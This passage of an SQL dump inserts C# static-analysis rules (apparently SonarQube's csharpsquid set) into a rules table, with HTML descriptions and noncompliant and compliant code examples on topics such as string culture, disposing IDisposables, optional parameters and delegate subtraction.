  readonly T point;  // this could be a struct
  public PointManager(T point)
  {
    this.point = point;
  }

  public void MovePointVertically(int newX)
  {
    point.X = newX; //Noncompliant; if point is a struct, then nothing happened
    Console.WriteLine(point.X);
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
interface IPoint
{
  int X { get; set; }
  int Y { get; set; }
}

class PointManager&lt;T&gt; where T : IPoint
{
  readonly T point;  // this could be a struct
  public PointManager(T point)
  {
    this.point = point;
  }

  public void MovePointVertically(int newX) // assignment has been removed
  {
    Console.WriteLine(point.X);
  }
}
</pre>
or
<pre>
interface IPoint
{
  int X { get; set; }
  int Y { get; set; }
}

class PointManager&lt;T&gt; where T : class, IPoint
{
  readonly T point;  // this can only be a class
  public PointManager(T point)
  {
    this.point = point;
  }

  public void MovePointVertically(int newX)
  {
    point.X = newX;  // this assignment is guaranteed to work
    Console.WriteLine(point.X);
  }
}
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817812085, 1510817812086, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (303, 'Culture should be specified for "string" operations', 'S1449', NULL, 'csharpsquid', '<p>
    <code>string.ToLower()</code>, <code>ToUpper</code>, <code>IndexOf</code>, <code>LastIndexOf</code>, and <code>Compare</code> are 
    all culture-dependent, as are some (floating point number and <code>DateTime</code>-related) calls to <code>ToString</code>. Fortunately, all have
    variants which accept an argument specifying the culture or formatter to use. Leave that argument off and the call will use the
    system default culture, possibly creating problems with international characters.
</p>
<p>
    <code>string.CompareTo()</code> is also culture specific, but has no overload that takes a culture information, so instead it''s better to use 
    <code>CompareOrdinal</code>, or <code>Compare</code> with culture.
</p>
<p>
    Calls without a culture may work fine in the system''s "home" environment, but break in ways that are extremely difficult to
    diagnose for customers who use different encodings. Such bugs can be nearly, if not completely, impossible to reproduce when it''s
    time to fix them.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
var lowered = someString.ToLower(); //Noncompliant
</pre>

<h2>Compliant Solution</h2>
<pre>
var lowered = someString.ToLower(CultureInfo.InvariantCulture);
</pre>
or
<pre>
var lowered = someString.ToLowerInvariant();
</pre>

<h2>See</h2>
<ul>
    <li><a href="https://www.securecoding.cert.org/confluence/x/EwAiAg">CERT, STR02-J.</a> - Specify an appropriate locale when comparing locale-dependent data</li>
</ul>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,unpredictable', false, 'HTML', 1510817812091, 1510817812091, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (304, 'Objects should not be created to be dropped immediately without being used', 'S1848', NULL, 'csharpsquid', '<p>
There is no good reason to create a new object to not do anything with it. Most of the time, this is due to a missing piece of code and so could lead to an unexpected behavior in production.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
if (x < 0)
  new ArgumentException("x must be nonnegative");
</pre>

<h2>Compliant Solution</h2>
<pre>
if (x < 0)
  throw new ArgumentException("x must be nonnegative");
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812099, 1510817812099, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (305, 'Method calls should not resolve ambiguously to overloads with "params"', 'S3220', NULL, 'csharpsquid', '<p>
    The rules for method resolution are complex and perhaps not properly understood by all coders. The <code>params</code> keyword can make
    method declarations overlap in non-obvious ways, so that slight changes in the argument types of an invocation can resolve to different
    methods.
</p>
<p>
    This rule raises an issue when an invocation resolves to a method declaration with <code>params</code>, but could also resolve to another
    non-<code>params</code> method too.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass
{
  private void Format(string a, params object[] b) { }

  private void Format(object a, object b, object c) { }
}

// ...
MyClass myClass = new MyClass();

myClass.Format("", null, null); //Noncompliant, resolves to the first Format with params, but was that intended?
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812103, 1510817812104, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (306, 'Write-only properties should not be used', 'S2376', NULL, 'csharpsquid', '<p>
    Properties with only setters are confusing and counterintuitive. Instead, a property getter should be added if possible, or
    the property should be replaced with a setter method.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
class Program
{
    public int Foo  //Non-Compliant
    {
        set
        {
            // ... some code ...
        }
    }
}
</pre>

<h2>Compliant Solution</h2>

<pre>
class Program
{
    public void SetFoo(int value)
    {
        // ... some code ...
    }
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812105, 1510817812106, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (307, 'Optional parameters should be passed to "base" calls', 'S3466', NULL, 'csharpsquid', '<p>
    Generally, writing the least code that will readably do the job is a good thing, so omitting default parameter values seems to 
    make sense. Unfortunately, when you omit them from the <code>base</code> call in an override, you''re not actually getting the 
    job done thoroughly, because you''re ignoring the value the caller passed in. The result will likely not be what the caller 
    expected.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public class BaseClass
{
  public virtual void MyMethod(int i = 1)
  { 
    Console.WriteLine(i);
  }
}

public class DerivedClass : BaseClass
{
  public override void MyMethod(int i = 1)
  {
    // ... 
    base.MyMethod(); // Noncompliant; caller''s value is ignored
  }

  static int Main(string[] args) 
  {
    DerivedClass dc = new DerivedClass();
    dc.MyMethod(12);  // prints 1
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public class BaseClass
{
  public virtual void MyMethod(int i = 1)
  { 
    Console.WriteLine(i);
  }
}

public class DerivedClass : BaseClass
{
  public override void MyMethod(int i = 1)
  {
    // ... 
    base.MyMethod(i);
  }

  static int Main(string[] args) 
  {
    DerivedClass dc = new DerivedClass();
    dc.MyMethod(12);  // prints 12
  }
}
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812107, 1510817812107, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (308, '"IDisposables" should be disposed', 'S2930', NULL, 'csharpsquid', '<p>
    When writing managed code, you don''t need to worry about allocating or freeing memory: The garbage collector takes care of it. For efficiency
    reasons, some objects such as <code>Bitmap</code> use unmanaged memory, enabling for example the use of pointer arithmetic. Such objects have
    potentially huge unmanaged memory footprints, but will have a tiny managed ones. Unfortunately, the garbage collector only sees the tiny
    managed footprint, and fails to reclaim the unmanaged memory (by calling <code>Bitmap</code>''s finalizer method) in a timely fashion.
</p>

<p>
    Moreover, memory is not the only system resource which needs to managed in a timely fashion: The operating system can only handle having so
    many file descriptors (e.g. <code>FileStream</code>) or sockets (e.g. <code>WebClient</code>) open at any given time. Therefore, it is
    important to <code>Dispose</code> of them as soon as they are no longer needed, rather than relying on the garbage collector to call these
    objects'' finalizers at some nondeterministic point in the future.
</p>

<p>
    This rule tracks <code>private</code> fields and local variables of the following <code>IDisposable</code> types, which are never disposed,
    closed, aliased, returned, or passed to other methods.
</p>

<ul>
    <li>
        <code>System.IO</code> namespace
        <ul>
            <li><code>System.IO.FileStream</code></li>
            <li><code>System.IO.StreamReader</code></li>
            <li><code>System.IO.StreamWriter</code></li>
        </ul>
    </li>
    <li>
        <code>System.Net</code> namespace
        <ul>
            <li><code>System.Net.WebClient</code></li>
        </ul>
    </li>
    <li>
        <code>System.Net.Sockets</code> namespace
        <ul>
            <li><code>System.Net.Sockets.Socket</code></li>
            <li><code>System.Net.Sockets.TcpClient</code></li>
            <li><code>System.Net.Sockets.TcpListener</code></li>
            <li><code>System.Net.Sockets.UdpClient</code></li>
        </ul>
    <li>
        <code>System.Drawing</code> namespace
        <ul>
            <li><code>System.Drawing.Image</code></li>
            <li><code>System.Drawing.Bitmap</code></li>
        </ul>
    </li>
</ul>

which are either instantiated directly using the <code>new</code> operator, or using one of the following factory methods:

<ul>
    <li><code>System.IO.File.Create()</code></li>
    <li><code>System.IO.File.Open()</code></li>
    <li><code>System.Drawing.Image.FromFile()</code></li>
    <li><code>System.Drawing.Image.FromStream()</code></li>
</ul>

on both private fields and local variables.

<h2>Noncompliant Code Example</h2>
<pre>
public class ResourceHolder
{
  private FileStream fs; // Noncompliant; Dispose or Close are never called
  public void OpenResource(string path)
  {
    this.fs = new FileStream(path, FileMode.Open);
  }
  public void WriteToFile(string path, string text)
  {
    var fs = new FileStream(path, FileMode.Open); // Noncompliant
    var bytes = Encoding.UTF8.GetBytes(text);
    fs.Write(bytes, 0, bytes.Length);
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public class ResourceHolder : IDisposable
{
  private FileStream fs;
  public void OpenResource(string path)
  {
    this.fs = new FileStream(path, FileMode.Open);
  }
  public void Dispose()
  {
    this.fs.Dispose();
  }
  public void WriteToFile(string path, string text)
  {
    using (var fs = new FileStream(path, FileMode.Open))
    {
      var bytes = Encoding.UTF8.GetBytes(text);
      fs.Write(bytes, 0, bytes.Length);
    }
  }
}
</pre>

<h2>Exceptions</h2>
<p>
    <code>IDisposable</code> variables returned from a method or passed to other methods are ignored, as are local <code>IDisposable</code>s that
    are initialized with other <code>IDisposable</code>s.
</p>
<pre>
public Stream WriteToFile(string path, string text)
{
  var fs = new FileStream(path, FileMode.Open); // Compliant, because it is returned
  var bytes = Encoding.UTF8.GetBytes(text);
  fs.Write(bytes, 0, bytes.Length);
  return fs;
}
public void ReadFromStream(Stream s)
{
  var sr = new StreamReader(s); // Compliant as it would close the underlying stream.
  // ...
}
</pre>

<h2>See</h2>
<ul>
    <li> <a href="http://cwe.mitre.org/data/definitions/459.html">MITRE, CWE-459</a> - Incomplete Cleanup</li>
</ul>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'cwe,denial-of-service', false, 'HTML', 1510817812109, 1510817812110, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (309, 'Fields should not be initialized to default values', 'S3052', NULL, 'csharpsquid', '<p>
    The compiler automatically initializes class fields to their default values before setting them with any initialization
    values, so there is no need to explicitly set a field to its default value. Further, under the logic that cleaner code
    is better code, it''s considered poor style to do so.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
class X
{
  public int field = 0; // Noncompliant
  public object o = null; // Noncompliant
}
</pre>

<h2>Compliant Solution</h2>
<pre>
class X
{
  public int field;
  public object o;
}
</pre>

<h2>Exceptions</h2>
<code>const</code> fields are ignored.', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'convention,finding', false, 'HTML', 1510817812111, 1510817812112, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (313, 'Parameters with "[DefaultParameterValue]" attributes should also be marked with "[Optional]"', 'S3450', NULL, 'csharpsquid', '<p>
    There is no point in providing a default value for a parameter if callers are required to provide a value for it anyway. Thus,
    <code>[DefaultParameterValue]</code> should always be used in conjunction with <code>[Optional]</code>.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public void MyMethod([DefaultParameterValue(5)] int j) //Noncompliant, useless
{
  Console.WriteLine(j);
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public void MyMethod(int j = 5)
{
  Console.WriteLine(j);
}
</pre>
<p>or</p>
<pre>
public void MyMethod([DefaultParameterValue(5)][Optional] int j)
{
  Console.WriteLine(j);
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812121, 1510817812121, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (310, '"if ... else if" constructs should end with "else" clause', 'S126', NULL, 'csharpsquid', '<p>
  This rule applies whenever an <code>if</code> statement is followed by one or
  more <code>else if</code> statements, the final <code>else if</code> should be
  followed by an <code>else</code> statement.
</p>

<p>
The requirement for a final <code>else</code> statement is defensive programming.
The <code>else</code> statement should either take appropriate action or contain
a suitable comment as to why no action is taken. This is consistent with the
requirement to have a final <code>default</code> clause in a <code>switch</code>
statement.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
if (x == 0)
{
  doSomething();
} else if (x == 1)
{
  doSomethingElse();
}
</pre>

<h2>Compliant Solution</h2>
<pre>
if (x == 0)
{
  doSomething();
} else if (x == 1)
{
  doSomethingElse();
} else
{
  throw new IllegalStateException();
}
</pre>

<h2>See</h2>

<ul>
    <li>MISRA C:2004, 14.10 - All if...else if constructs shall be terminated with an else clause.</li>
    <li>MISRA C++:2008, 6-4-2 - All if...else if constructs shall be terminated with an else clause.</li>
    <li>MISRA C:2012, 15.7 - All if...else if constructs shall be terminated with an else statement</li>
    <li><a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C</a> - Strive for logical completeness</li>
    <li><a href="https://www.securecoding.cert.org/confluence/x/JoIyAQ">CERT, MSC01-CPP</a> - Strive for logical completeness</li>
    <li><a href="https://www.securecoding.cert.org/confluence/x/PQHRAw">CERT, MSC64-Java</a> - Strive for logical completeness</li>
</ul>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,misra', false, 'HTML', 1510817812115, 1510817812117, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (311, 'Delegates should not be subtracted', 'S3172', NULL, 'csharpsquid', '<p>
    In C#, delegates can be added together to chain their execution, and subtracted to remove their execution from the chain.
</p>
<p>
    Subtracting a chain of delegates from another one might yield unexpected results as shown hereunder - and is likely to be a bug
</p>

<h2>Noncompliant Code Example</h2>
<pre>
MyDelegate first, second, third, fourth;
first = () => Console.Write("1");
second = () => Console.Write("2");
third = () => Console.Write("3");
fourth = () => Console.Write("4");

MyDelegate chain1234 = first + second + third + fourth; // Compliant - chain sequence = "1234"
MyDelegate chain12 = chain1234 - third - fourth; // Compliant - chain sequence = "12"

// The chain sequence of "chain23" will be "1234" instead of "23"!
// Indeed, the sequence "1234" does not contain the subsequence "14", so nothing is subtracted
// (but note that "1234" contains both the "1" and "4" subsequences)
MyDelegate chain23 = chain1234 - (first + fourth); // Noncompliant

chain23(); // will print "1234"!
</pre>

<h2>Compliant Solution</h2>
<pre>
MyDelegate chain23 = chain1234 - first - fourth; // Compliant - "1" is first removed, followed by "4"

chain23(); // will print "23"
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, NULL, false, 'HTML', 1510817812118, 1510817812119, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (312, '"for" loop stop conditions should be invariant', 'S127', NULL, 'csharpsquid', '<p>
    <code>for</code> loop stop conditions must be invariant (i.e. true at both the beginning and ending of every loop iteration). Ideally, this means that the stop condition is set to a local variable just before the loop begins.
</p>
<p>
    Stop conditions that are not invariant are difficult to understand and maintain, and will likely lead to the introduction of errors in the future.
</p>
<p>
    This rule tracks three types of non-invariant stop conditions:
    <ul>
        <li>When the loop counters are updated in the body of the <code>for</code> loop</li>
        <li>When the stop condition depend upon a method call</li>
        <li>When the stop condition depends on an object property, since such properties could change during the execution of the loop.</li>
    </ul>
</p>

<h2>Noncompliant Code Example</h2>
<pre>
class Foo
{
    static void Main()
    {
        for (int i = 1; i &lt;= 5; i++)
        {
            Console.WriteLine(i);
            if (condition)
            {
               i = 20;
           }
        }
    }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
class Foo
{
    static void Main()
    {
        for (int i = 1; i &lt;= 5; i++)
        {
            Console.WriteLine(i);
        }
    }
}
</pre>

<h2>See</h2>

<ul>
    <li>MISRA C:2004, 13.6 - Numeric variables being used within a for loop for iteration counting shall not be modified in the body of the loop.</li>
    <li>MISRA C++:2008, 6-5-3 - The loop-counter shall not be modified within condition or statement.</li>
</ul>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'misra,pitfall', false, 'HTML', 1510817812119, 1510817812120, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (314, 'Sections of code should not be "commented out"', 'S125', NULL, 'csharpsquid', '<p>
    Programmers should not comment out code as it bloats programs and reduces readability.
    Unused code should be deleted and can be retrieved from source control history if required.
</p>

<h2>See</h2>
<ul>
    <li>MISRA C:2004, 2.4 - Sections of code should not be "commented out".</li>
    <li>MISRA C++:2008, 2-7-2 - Sections of code shall not be "commented out" using C-style comments.</li>
    <li>MISRA C++:2008, 2-7-3 - Sections of code should not be "commented out" using C++ comments.</li>
    <li>MISRA C:2012, Dir. 4.4 - Sections of code should not be "commented out"</li>
</ul>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'misra,unused', false, 'HTML', 1510817812122, 1510817812123, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (315, 'Optional parameters should not be used', 'S2360', NULL, 'csharpsquid', '<p>
    The overloading mechanism should be used in place of optional parameters for several reasons:
    <ul>
        <li>Optional parameter values are baked into the method call site code, thus, if a default value has been changed, all referencing assemblies need to be rebuilt, otherwise the original values will be used.</li>
        <li>The Common Language Specification (CLS) allows compilers to ignore default parameter values, and thus require the caller to explicitly specify the values.</li>
        <li>The concept of optional argument exists only in VB.Net and C#. In all other languages like C++ or Java, the overloading mechanism is the only way to get the same behavior.</li>
        <li>Optional parameters prevent muddying the definition of the function contract. Here is a simple example: if there are two optional parameters, when one is defined, is the second one still optional or mandatory?</li>
    </ul>
</p>

<h2>Noncompliant Code Example</h2>
<pre>
void Notify(string company, string office = "QJZ") // Noncompliant
{
}
</pre>

<h2>Compliant Solution</h2>

<pre>
void Notify(string company)
{
  Notify(company, "QJZ");
}
void Notify(string company, string office = "QJZ")
{
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812124, 1510817812124, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (316, '"partial" method parameter names should match', 'S927', NULL, 'csharpsquid', '<p>
    When the parameters to the implementation of a <code>partial</code> method don''t match those
    in the signature declaration, then confusion is almost guaranteed. Either the implementer was
    confused when he renamed, swapped or mangled the parameter names in the implementation, or
    callers will be confused.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
partial class Point
{
  partial void MoveVertically(int z);
}

partial class Point
{
  int x = 0;
  int y = 0;
  int z = 0;

  partial void MoveVertically(int y)  // Noncompliant
  {
    this.y = y;
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
partial class Point
{
  partial void MoveVertically(int z);
}

partial class Point
{
  int x = 0;
  int y = 0;
  int z = 0;

  partial void MoveVertically(int z)
  {
    this.z = z;
  }
}
</pre>

<h2>See</h2>

<ul>
    <li>MISRA C:2004, 8.3 - For each function parameter the type given in the declaration and definition shall be identical, and the return types shall also be identical</li>
    <li>MISRA C:2004, 16.4 - The identifiers used in the declaration and definition of a function shall be identical.</li>
    <li>MISRA C++:2008, 8-4-2 - The identifiers used for the parameters in a re-declaration of a function shall be identical to those in the declaration.</li>
    <li>MISRA C:2012, 8.3 - All declarations of an object or function shall use the same names and type qualifiers.</li>
</ul>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'cert,misra,pitfall', false, 'HTML', 1510817812125, 1510817812126, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (317, 'Inner class members should not shadow outer class "static" or type members', 'S3218', NULL, 'csharpsquid', '<p>
    It''s possible to name the members of an inner class the same as the <code>static</code> members of its enclosing class -
    possible, but a bad idea. That''s because maintainers may be confused about which members are being used where. Instead the
    inner class'' members should be renamed and all the references updated.
</p>

<h2>Noncompliant Code Sample</h2>
<pre>
class Outer
{
  public static int A;

  public class Inner
  {
    public int A; //Noncompliant
    public int MyProp
    {
      get { return A; }  // Returns inner A. Was that intended?
    }
  }
}
</pre>
After a rename
<pre>
class Outer
{
  public static int A;

  public class Inner
  {
    public int B;
    public int MyProp
    {
      get { return A; }  // Still compiles and runs but functionality has changed
    }
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
class Outer
{
  public static int A;

  public class Inner
  {
    public int InnerA;
    public int MyProp
    {
      get { return InnerA; }
    }
  }
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'design,pitfall', false, 'HTML', 1510817812126, 1510817812127, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (318, '"Explicit" conversions of "foreach" loops should not be used', 'S3217', NULL, 'csharpsquid', '<p>
    The <code>foreach</code> statement was introduced in the C# language prior to generics. To make it easier to work with
    non-generic collections available at that time such as <code>ArrayList</code>, the <code>foreach</code> statements allows
    to downcast the collection''s element of type <code>Object</code> into any other type. The problem is that, to achieve that,
    the <code>foreach</code> statements silently performs <code>explicit</code> type conversion, which at runtime can result in
    an <code>InvalidCastException</code> to be thrown.
</p>
<p>
    C# code iterating on generic collections or arrays should not rely on <code>foreach</code> statement''s silent <code>explicit</code>
    conversions.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit { }
public class Orange : Fruit { }
public class Apple : Fruit { }

class MyTest
{
  public void Test()
  {
    var fruitBasket = new List<Fruit>();
    fruitBasket.Add(new Orange());
    fruitBasket.Add(new Orange());
    // fruitBasket.Add(new Apple());  // uncommenting this line will make both foreach below throw an InvalidCastException

    foreach (Fruit fruit in fruitBasket)
    {
      var orange = (Orange)fruit; // This "explicit" conversion is hidden within the foreach loop below
      ...
    }

    foreach (Orange orange in fruitBasket) // Noncompliant
    {
      ...
    }
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
var fruitBasket = new List<Orange>();
fruitBasket.Add(new Orange());
fruitBasket.Add(new Orange());
// fruitBasket.Add(new Apple());  // uncommenting this line won''t compile

foreach (Orange orange in fruitBasket)
{
  ...
}
</pre>
or
<pre>
var fruitBasket = new List<Fruit>();
fruitBasket.Add(new Orange());
fruitBasket.Add(new Orange());
fruitBasket.Add(new Apple());

foreach (Orange orange in fruitBasket.OfType<Orange>())
{
  ...
}
</pre>

<h2>Exceptions</h2>
<p>
    The rule ignores iterations on collections of <code>object</code>s. This includes legacy code that uses
    <code>ArrayList</code>. Furthermore, the rule does not report on cases when user defined conversions are
    being called.
</p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'suspicious', false, 'HTML', 1510817812128, 1510817812129, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (319, 'Control flow statements "if", "for", "foreach", "do", "while", "switch" and "try" should not be nested too deeply', 'S134', NULL, 'csharpsquid', '<p>
    Nested <code>if</code>, <code>switch</code>, <code>for</code>, <code>foreach</code>, <code>while</code>, <code>do</code>, and <code>try</code> statements
    are key ingredients for making what''s known as "Spaghetti code". Such code is hard to read, refactor and therefore maintain.
</p>

<h2>Noncompliant Code Example</h2>

<p>With the default threshold of 3:</p>

<pre>
if (condition1) // Compliant - depth = 1
{
  /* ... */
  if (condition2) // Compliant - depth = 2
  {
    /* ... */
    for(int i = 0; i < 10; i++) // Compliant - depth = 3, not exceeding the limit
    {
      /* ... */
      if (condition4) // Noncompliant - depth = 4
      {
        if (condition5) // Depth = 5, exceeding the limit, but issues are only reported on depth = 4
        {
          /* ... */
        }
        return;
      }
    }
  }
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'brain-overload', false, 'HTML', 1510817812130, 1510817812131, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (324, 'Values should not be uselessly incremented', 'S2123', NULL, 'csharpsquid', '<p>
    A value that is incremented or decremented and then not stored is at best wasted code and at worst a bug.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
